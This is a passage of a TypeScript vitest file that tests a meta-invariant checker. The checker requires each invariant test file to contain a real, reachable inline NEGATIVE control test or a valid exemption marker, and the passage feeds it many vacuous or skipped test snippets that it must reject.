      `expected exactly ${EXPECTED_STRUCTURAL_FILE_COUNT} structural-invariant files ` +
        "(*-invariant.test.ts + curated EXTRA_STRUCTURAL_FILES)"
    ).toBe(EXPECTED_STRUCTURAL_FILE_COUNT);

    const violations: string[] = [];
    for (const file of files) {
      const rel = path.relative(repoRoot, file);
      const content = await fs.readFile(file, "utf8");
      const err = checkInvariantHasNegativeCoverage(rel, content);
      if (err) violations.push(err);
    }
    expect(violations, violations.join("\n\n")).toEqual([]);

    expect(duplicateStringEntryKeys(EXPECTED_REPOSITORY_MUTATION_HELPER_CALL_ENTRIES)).toEqual([]);
    expect(duplicateStringEntryKeys(EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORT_ENTRIES)).toEqual([]);
    expect(duplicateStringEntryKeys(EXPECTED_REVIEWED_ORDINARY_OWNER_SHA256_ENTRIES)).toEqual([]);
    expect([...EXPECTED_REPOSITORY_MUTATION_HELPER_CALLS.keys()].sort()).toEqual(
      [...EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORTS.keys()].sort()
    );
    const rawMutationInventorySet = new Set<string>(RAW_REPLACE_INVENTORY_FILES);
    expect(entryKeysOutside(EXPECTED_REPOSITORY_MUTATION_HELPER_CALL_ENTRIES, rawMutationInventorySet)).toEqual([]);
    expect(ownerlessReviewedTransformIds(REVIEWED_ORDINARY_TRANSFORMS)).toEqual([]);
    expect([...EXPECTED_REVIEWED_ORDINARY_OWNER_SHA256.keys()].sort()).toEqual(
      REVIEWED_ORDINARY_TRANSFORMS.map((reviewed) => reviewed.id).sort()
    );
    for (const filename of RAW_REPLACE_INVENTORY_FILES) {
      const source = await fs.readFile(path.join(repoRoot, "tests", filename), "utf8");
      const problems = repositoryMutationOracleProblems(filename, source);
      expect(problems, problems.join("\n")).toEqual([]);
      const expectedHelperCalls = EXPECTED_REPOSITORY_MUTATION_HELPER_CALLS.get(filename);
      const expectedHelperImports = EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORTS.get(filename);
      if (importsExactMutationHelperModule(filename, source) && expectedHelperImports === undefined) {
        throw new Error(`${filename} imports exact mutation helpers but is absent from their binding census`);
      }
      if (expectedHelperImports !== undefined) {
        const bindingProblems = exactMutationHelperBindingProblems(filename, source);
        expect(bindingProblems, bindingProblems.join("\n")).toEqual([]);
      }
      if (expectedHelperCalls !== undefined) {
        if (filename === "abs-path-leak-invariant.test.ts") {
          for (const requiredCall of ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS) {
            expect(
              exactMutationHelperCallCount(filename, source, requiredCall),
              `${filename} must retain exactly one ${requiredCall.label} exact mutation call`
            ).toBe(1);
          }
        }
        if (filename === "docs-consistency.test.ts") {
          for (const requiredCall of DOCS_CONSISTENCY_CONVERTED_RAW_MUTATIONS) {
            expect(
              exactMutationHelperCallCount(filename, source, requiredCall),
              `${filename} must retain exactly one ${requiredCall.label} exact mutation call`
            ).toBe(1);
          }
        }
        const actualHelperCalls = exactMutationHelperCallCensus(filename, source);
        expect(actualHelperCalls.count, `${filename} exact mutation-helper count drifted`).toBe(
          expectedHelperCalls.count
        );
        expect(
          actualHelperCalls.sha256,
          `${filename} exact mutation-helper identity drifted; observed ${actualHelperCalls.sha256}`
        ).toBe(expectedHelperCalls.sha256);
      }
    }
  });

  // NEGATIVE control for the META-invariant itself (eats its own dog food).
  // Without these, the check above could trivially pass against a regex bug.

  it("NEGATIVE: checkInvariantHasNegativeCoverage detects file with no coverage", () => {
    const fakeContent = `// just regular code\nimport { describe } from "vitest";\ndescribe("foo", () => {});`;
    const err = checkInvariantHasNegativeCoverage("fake-invariant.test.ts", fakeContent);
    expect(err).toMatch(/no INLINE NEGATIVE control test/);
  });

  it("NEGATIVE: a comment/TODO token with no inline test is REJECTED (rc.23 — closes the audit bypass)", () => {
    // The exact bypass the rc.21 audit reproduced: token only in an aspirational
    // comment, plus a vacuous test. Must NOT satisfy the rule anymore.
    const todoOnly = `// TODO: add a negative-control test later\nit("does a thing", () => { expect(1).toBeGreaterThan(0); });`;
    expect(checkInvariantHasNegativeCoverage("x-invariant.test.ts", todoOnly)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    // And a "covered by sibling" prose comment alone (no inline test, no marker) is also rejected —
    // such files must use the explicit EXEMPT marker (path b), which is unambiguous.
    const proseOnly = `// NEGATIVE control coverage lives in a sibling file\nit("checks", () => { expect(2).toBe(2); });`;
    expect(checkInvariantHasNegativeCoverage("y-invariant.test.ts", proseOnly)).toMatch(/META-INVARIANT-EXEMPT/);
    const deadFunction = `function neverCalled() { it("NEGATIVE: catches drift", () => { expect(run()).toBe(false); }); }`;
    expect(checkInvariantHasNegativeCoverage("dead-function-invariant.test.ts", deadFunction)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const deadBranch = `if (false) { it("NEGATIVE: catches drift", () => { expect(run()).toBe(false); }); }`;
    expect(checkInvariantHasNegativeCoverage("dead-branch-invariant.test.ts", deadBranch)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const deadNestedBranch = `describe("suite", () => { if (false) { it("NEGATIVE: catches drift", () => { expect(run()).toBe(false); }); } });`;
    expect(checkInvariantHasNegativeCoverage("dead-nested-branch-invariant.test.ts", deadNestedBranch)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const registrationAfterReturn = `describe("suite", () => { return; it("NEGATIVE: catches drift", () => { expect(run()).toBe(false); }); });`;
    expect(
      checkInvariantHasNegativeCoverage("after-return-registration-invariant.test.ts", registrationAfterReturn)
    ).toMatch(/no INLINE NEGATIVE control test/);
    const registrationAfterThrow = `describe("suite", () => { throw new Error("stop"); it("NEGATIVE: catches drift", () => { expect(run()).toBe(false); }); });`;
    expect(
      checkInvariantHasNegativeCoverage("after-throw-registration-invariant.test.ts", registrationAfterThrow)
    ).toMatch(/no INLINE NEGATIVE control test/);
    const assertionAfterReturnInNegativeDescribe = `describe("NEGATIVE: claims coverage", () => { return; it("never registered", () => { expect(run()).toBe(false); }); });`;
    expect(
      checkInvariantHasNegativeCoverage(
        "after-return-negative-describe-invariant.test.ts",
        assertionAfterReturnInNegativeDescribe
      )
    ).toMatch(/no INLINE NEGATIVE control test/);
  });

  it("NEGATIVE: checkInvariantHasNegativeCoverage accepts file with NEGATIVE token + asserting body (uppercase)", () => {
    const goodContent = `// has coverage\nit("NEGATIVE: catches drift", () => { expect(check("bad")).toMatch(/x/); });`;
    expect(checkInvariantHasNegativeCoverage("good-invariant.test.ts", goodContent)).toBeNull();
    const explicitFailure = `it("NEGATIVE: catches missed drift", () => { if (!detected()) expect.fail("missed"); });`;
    expect(checkInvariantHasNegativeCoverage("expect-fail-invariant.test.ts", explicitFailure)).toBeNull();
    const positiveAssertionCount = `it("NEGATIVE: requires an assertion", () => { expect.assertions(1); });`;
    expect(checkInvariantHasNegativeCoverage("assertion-count-invariant.test.ts", positiveAssertionCount)).toBeNull();
    const nonSkippedOptions = `it("NEGATIVE: catches drift", { timeout: 1000 }, () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("options-invariant.test.ts", nonSkippedOptions)).toBeNull();
    const reachableAnd = `it("NEGATIVE: catches drift", () => { true && expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("reachable-and-invariant.test.ts", reachableAnd)).toBeNull();
    const reachableOr = `it("NEGATIVE: catches drift", () => { false || expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("reachable-or-invariant.test.ts", reachableOr)).toBeNull();
    const reachableConditional = `it("NEGATIVE: catches drift", () => { true ? expect(run()).toBe(false) : undefined; });`;
    expect(
      checkInvariantHasNegativeCoverage("reachable-conditional-invariant.test.ts", reachableConditional)
    ).toBeNull();
    const conditionalCiSkip = `it("NEGATIVE: catches drift", (ctx) => { if (missingBuild()) return ctx.skip(); expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("conditional-skip-invariant.test.ts", conditionalCiSkip)).toBeNull();
    const conditionalDestructuredSkip = `it("NEGATIVE: catches drift", ({ skip }) => { if (missingBuild()) return skip(); expect(run()).toBe(false); });`;
    expect(
      checkInvariantHasNegativeCoverage("conditional-destructured-skip-invariant.test.ts", conditionalDestructuredSkip)
    ).toBeNull();
    const skippedSibling = `describe("suite", () => { it.skip("optional", () => {}); it("NEGATIVE: catches drift", () => { expect(run()).toBe(false); }); });`;
    expect(checkInvariantHasNegativeCoverage("skipped-sibling-invariant.test.ts", skippedSibling)).toBeNull();
  });

  it("NEGATIVE: checkInvariantHasNegativeCoverage accepts negative-control describe with asserting nested test (hyphenated)", () => {
    const goodContent = `// has coverage\ndescribe("foo — negative-control via fixtures", () => { it("flags drift", () => { expect(run()).toBe(false); }); });`;
    expect(checkInvariantHasNegativeCoverage("good-invariant.test.ts", goodContent)).toBeNull();
  });

  it("NEGATIVE: an EMPTY-body negative control is REJECTED (rc.26 — closes the vacuity bypass)", () => {
    // The HIGH-1 gap the rc.25 audit found: a title with the token but a body
    // that asserts NOTHING is vacuous — the exact thing this META-invariant forbids.
    const emptyBody = `// header\nit("NEGATIVE: catches drift", () => {});`;
    expect(checkInvariantHasNegativeCoverage("empty-invariant.test.ts", emptyBody)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const vacuousExpression = `it("NEGATIVE: claims coverage", () => true);`;
    expect(checkInvariantHasNegativeCoverage("vacuous-expression.test.ts", vacuousExpression)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const borrowedAssertion =
      `it("NEGATIVE: claims coverage", () => true);\n` +
      `it("ordinary positive", () => { expect(run()).toBe(true); });`;
    expect(checkInvariantHasNegativeCoverage("borrowed-assertion.test.ts", borrowedAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const assertionString = `it("NEGATIVE: claims coverage", () => "expect(run()).toBe(false)");`;
    expect(checkInvariantHasNegativeCoverage("assertion-string.test.ts", assertionString)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const assertionRegex = String.raw`it("NEGATIVE: claims coverage", () => /expect\(run\(\)\)\.toBe\(false\)/);`;
    expect(checkInvariantHasNegativeCoverage("assertion-regex.test.ts", assertionRegex)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const assertionComment =
      `it("NEGATIVE: claims coverage", () => {\n` + `  return true; // expect(run()).toBe(false)\n` + `});`;
    expect(checkInvariantHasNegativeCoverage("assertion-comment.test.ts", assertionComment)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const deadNestedAssertion =
      `it("NEGATIVE: claims coverage", () => {\n` +
      `  const neverCalled = () => expect(run()).toBe(false);\n` +
      `  return true;\n` +
      `});`;
    expect(checkInvariantHasNegativeCoverage("dead-nested-assertion.test.ts", deadNestedAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const bareExpect = `it("NEGATIVE: claims coverage", () => { expect(value); });`;
    expect(checkInvariantHasNegativeCoverage("bare-expect.test.ts", bareExpect)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const zeroAssertions = `it("NEGATIVE: claims coverage", () => { expect.assertions(0); });`;
    expect(checkInvariantHasNegativeCoverage("zero-assertions.test.ts", zeroAssertions)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const dynamicAssertions = `it("NEGATIVE: claims coverage", () => { expect.assertions(count); });`;
    expect(checkInvariantHasNegativeCoverage("dynamic-assertions.test.ts", dynamicAssertions)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const afterReturn = `it("NEGATIVE: claims coverage", () => { return; expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("after-return.test.ts", afterReturn)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const literalFalse = `it("NEGATIVE: claims coverage", () => { if (false) expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("literal-false.test.ts", literalFalse)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const falseAndAssertion = `it("NEGATIVE: claims coverage", () => { false && expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("false-and.test.ts", falseAndAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const trueOrAssertion = `it("NEGATIVE: claims coverage", () => { true || expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("true-or.test.ts", trueOrAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const falseLoopAssertion = `it("NEGATIVE: claims coverage", () => { while (false) expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("false-loop.test.ts", falseLoopAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const falseForAssertion = `it("NEGATIVE: claims coverage", () => { for (; false; ) expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("false-for.test.ts", falseForAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const falseConditionalAssertion = `it("NEGATIVE: claims coverage", () => { false ? expect(run()).toBe(false) : true; });`;
    expect(checkInvariantHasNegativeCoverage("false-conditional.test.ts", falseConditionalAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const skippedBeforeAssertion = `it("NEGATIVE: claims coverage", (ctx) => { ctx.skip(); expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("runtime-skipped.test.ts", skippedBeforeAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const awaitedSkipBeforeAssertion = `it("NEGATIVE: claims coverage", async (ctx) => { await ctx.skip(); expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("awaited-runtime-skipped.test.ts", awaitedSkipBeforeAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const voidSkipBeforeAssertion = `it("NEGATIVE: claims coverage", (ctx) => { void ctx.skip(); expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("void-runtime-skipped.test.ts", voidSkipBeforeAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const bracketSkipBeforeAssertion = `it("NEGATIVE: claims coverage", (ctx) => { ctx["skip"](); expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("bracket-runtime-skipped.test.ts", bracketSkipBeforeAssertion)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const destructuredSkipBeforeAssertion = `it("NEGATIVE: claims coverage", ({ ["skip"]: skipTest }) => { skipTest(); expect(run()).toBe(false); });`;
    expect(
      checkInvariantHasNegativeCoverage("destructured-runtime-skipped.test.ts", destructuredSkipBeforeAssertion)
    ).toMatch(/no INLINE NEGATIVE control test/);
    const skippedOptions = `it("NEGATIVE: claims coverage", { skip: true }, () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("skipped-options.test.ts", skippedOptions)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const assertedSkippedOptions = `it("NEGATIVE: claims coverage", { skip: true as const }, () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("asserted-skipped-options.test.ts", assertedSkippedOptions)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const angleAssertedSkippedOptions = `it("NEGATIVE: claims coverage", { skip: <true>true }, () => { expect(run()).toBe(false); });`;
    expect(
      checkInvariantHasNegativeCoverage("angle-asserted-skipped-options.test.ts", angleAssertedSkippedOptions)
    ).toMatch(/no INLINE NEGATIVE control test/);
    const nonNullSkippedOptions = `it("NEGATIVE: claims coverage", { skip: true! }, () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("non-null-skipped-options.test.ts", nonNullSkippedOptions)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const satisfiesSkippedOptions = `it("NEGATIVE: claims coverage", { skip: true satisfies true }, () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("satisfies-skipped-options.test.ts", satisfiesSkippedOptions)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const aliasedRegistration = `const invariantTest = it; invariantTest("NEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("aliased-registration.test.ts", aliasedRegistration)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const eachRegistration = `it.each(["bad"])("NEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("each-registration.test.ts", eachRegistration)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const skippedRegistration = `it.skip("NEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("skipped-registration.test.ts", skippedRegistration)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const substringTitle = `it("NONNEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("substring-title.test.ts", substringTitle)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const negatedTitle = `it("NON-NEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("negated-title.test.ts", negatedTitle)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const unicodeAdjacentTitle = `it("ЯNEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("unicode-adjacent-title.test.ts", unicodeAdjacentTitle)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const astralAdjacentTitle = `it("𐐀NEGATIVE: claims coverage", () => { expect(run()).toBe(false); });`;
    expect(checkInvariantHasNegativeCoverage("astral-adjacent-title.test.ts", astralAdjacentTitle)).toMatch(
      /no INLINE NEGATIVE control test/
    );
  });

  it("NEGATIVE: a COMMENTED-OUT negative control is REJECTED (AST ignores comments)", () => {
    // A full-line-commented test must not satisfy the rule even though its text
    // contains both the token and an assertion.
    const commentedOut = `// it("NEGATIVE: catches drift", () => { expect(x).toBe(1); });\nit("real", () => { expect(2).toBe(2); });`;
    expect(checkInvariantHasNegativeCoverage("commented-invariant.test.ts", commentedOut)).toMatch(
      /no INLINE NEGATIVE control test/
    );
  });

  it("NEGATIVE: an expression-bodied arrow negative control is accepted (no `{` body)", () => {
    // `() => expect(...).toThrow()` owns a real matcher assertion — a brace body is not required.
    const exprBody = `// header\nit("NEGATIVE: rejects bad input", () => expect(() => parse("bad")).toThrow());`;
    expect(checkInvariantHasNegativeCoverage("expr-invariant.test.ts", exprBody)).toBeNull();
  });

  it("NEGATIVE: checkInvariantHasNegativeCoverage accepts explicit exempt marker", () => {
    const exemptContent = `// header\n// META-INVARIANT-EXEMPT: covered by sibling file foo-invariant.test.ts\nimport ...`;
    expect(checkInvariantHasNegativeCoverage("exempt-invariant.test.ts", exemptContent)).toBeNull();
  });

  it("NEGATIVE: late, empty, or inert exemption markers do NOT count", () => {
    const tooLate = `${Array(55).fill("// filler").join("\n")}\n// META-INVARIANT-EXEMPT: too late\n`;
    const err = checkInvariantHasNegativeCoverage("late-marker-invariant.test.ts", tooLate);
    expect(err).toMatch(/no INLINE NEGATIVE control test/);
    const emptyReason = `// META-INVARIANT-EXEMPT:   \n`;
    expect(checkInvariantHasNegativeCoverage("empty-marker-invariant.test.ts", emptyReason)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const stringMarker = `const marker = "// META-INVARIANT-EXEMPT: inert string";`;
    expect(checkInvariantHasNegativeCoverage("string-marker-invariant.test.ts", stringMarker)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const blockMarker = `/* // META-INVARIANT-EXEMPT: inert block comment */`;
    expect(checkInvariantHasNegativeCoverage("block-marker-invariant.test.ts", blockMarker)).toMatch(
      /no INLINE NEGATIVE control test/
    );
    const trailingMarker = `const active = true; // META-INVARIANT-EXEMPT: not a header line`;
    expect(checkInvariantHasNegativeCoverage("trailing-marker-invariant.test.ts", trailingMarker)).toMatch(
      /no INLINE NEGATIVE control test/
    );
  });
});
